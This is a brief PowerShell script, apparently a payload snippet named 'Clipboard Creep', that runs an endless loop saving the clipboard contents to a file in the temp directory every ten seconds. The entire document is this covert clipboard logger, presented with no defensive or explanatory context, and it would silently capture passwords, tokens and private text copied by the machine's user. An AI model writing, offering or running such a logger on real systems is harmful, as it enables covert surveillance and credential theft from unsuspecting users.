# Clipboard Creep - Continuously logs clipboard data
while ($true) {
  Get-Clipboard >> "$env:TEMP\cliplog.txt"
  Start-Sleep -Seconds 10
}
